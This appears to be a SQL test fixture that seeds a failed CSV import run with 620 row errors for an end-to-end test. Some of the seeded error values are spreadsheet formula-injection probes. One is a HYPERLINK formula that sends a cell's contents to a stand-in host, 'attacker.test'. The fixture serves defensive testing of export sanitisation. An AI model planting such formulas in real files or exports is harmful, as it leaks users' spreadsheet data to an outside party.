-- A validated-then-failed run with 620 problems, three of them formula-shaped.
-- Row numbers start at 10000, which is what puts them on a different scale from
-- the table's identity column -- the condition IMP2-05 needs to be visible.
delete from public.import_row_errors where run_id in (select id from public.import_runs where target = 'probe.contacts');
delete from public.import_runs where target = 'probe.contacts';
delete from public.files where name = 'browser-report.csv';

insert into public.files (id, tenant_id, category, name, storage_key, size_bytes, content_type, status, scan_status, uploaded_by)
values ('11111111-1111-4111-8111-111111111111', '00000000-0000-4e2e-8000-000000000001', 'imports', 'browser-report.csv', 'imports/browser-report.csv', 100, 'text/csv', 'ready', 'clean', 'e2e-owner');

insert into public.import_runs (id, tenant_id, target, status, format, source_file_id, delimiter, encoding, columns, mapping, operation, rows_total, rows_valid, errors_total, requested_by)
values ('22222222-2222-4222-8222-222222222222', '00000000-0000-4e2e-8000-000000000001', 'probe.contacts', 'validation_failed', 'csv',
        '11111111-1111-4111-8111-111111111111', ',', 'utf-8-sig', array['Email','Name'], '{"Email":"email","Name":"name"}'::jsonb,
        'skip_duplicate', 620, 0, 620, 'e2e-owner');

insert into public.import_row_errors (run_id, tenant_id, row_number, column_name, field, code, value)
select '22222222-2222-4222-8222-222222222222', '00000000-0000-4e2e-8000-000000000001', 10000 + g, 'Email', 'email', 'import.error.email',
       case g
         when 0 then '=HYPERLINK("https://attacker.test/?d="&A2,"Click")'
         when 1 then '+1+1'
         when 2 then '@SUM(1+1)'
         when 3 then '-2+3'
         else 'bad' || g || ',with"quotes"'
       end
from generate_series(0, 619) as g;
